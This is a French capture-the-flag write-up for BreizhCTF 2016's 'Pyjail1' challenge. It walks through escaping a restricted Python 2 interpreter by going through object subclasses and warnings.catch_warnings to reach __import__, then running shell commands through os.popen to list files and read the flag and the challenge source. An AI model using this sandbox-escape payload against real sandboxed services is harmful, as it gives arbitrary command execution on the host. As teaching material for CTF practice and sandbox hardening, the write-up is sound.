# BREIZHCTF 2K16
**Chall:** Pyjail1 |
**Points:** 300 |
**Taux de réussite:** 36% |



Le titre de ce challenge nous donne un bonne piste pour le résoudre.
Pour commnecer on cherche les fonctions autorisées.

En essayant quelques une on découvre que y a seulement la fonction dir qui est autorisée.

L'idée pour résoudre ce chall est de trouver une méthode accessible qui pourrait nous permettre d'exécuter une commande sur le système ou de trouver un chemin vers la fonction "__import__" de python afin de charger le modue "os".


En exécutant la commande suivante sur le serveur on obtient une liste de types et de classes accessbiles depuis notre "jail" :
```
>print ().__class__.__base__.__subclasses__()

[..., <class 'warnings.catch_warnings'>, ...]
```
On obtient une impotante liste de classes et de type exploitable.
Nous allons exploiter la classe "warnings.catch_warnings" car elle a un attribut qui nous intéresse "_module". (cf: https://hg.python.org/cpython/file/2.7/Lib/warnings.py)

On commence par crée une instace de cette classe dans une variable :
```
>wclass = ().__class__.__base__.__subclasses__()[59]()

```

Ensuite on regarde ce le contenu de l'attribut "_module"
```
>print wclass._module
<module 'warnings' from '/usr/lib/python2.7/warnings.pyc'>
>print dir(wclass._module)
['WarningMessage', '_OptionError', '__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_getaction', '_getcategory', '_processoptions', '_setoption', '_show_warning', 'catch_warnings', 'default_action', 'defaultaction', 'filters', 'filterwarnings', 'formatwarning', 'linecache', 'once_registry', 'onceregistry', 'resetwarnings', 'showwarning', 'simplefilter', 'sys', 'types', 'warn', 'warn_explicit', 'warnpy3k']

```

Un attribut très intéressant apparait, c'est "\__builtins\__".
```
>print wclass._module.__builtins__
 {..., '__import__': <built-in function __import__>, ...}
```
Et bingo, on a accès la fonction "__import__".

Maintenant qu'on a accès à cette fonction il ne reste plus qu'à importer le module os et exécuter des commandes sur le système afin de récupérer le flag.

```
>print wclass._module.__builtins__['__import__']('os').popen("pwd && ls -alR ").read()
>print wclass._module.__builtins__['__import__']('os').popen("cat flag").read()
BZH{flag flag \o/}
```
PS:  j'ai oublié de copier le flag ^^

De même on exécute une commande pour récupérer le code du chall "cat python_vm1.py".


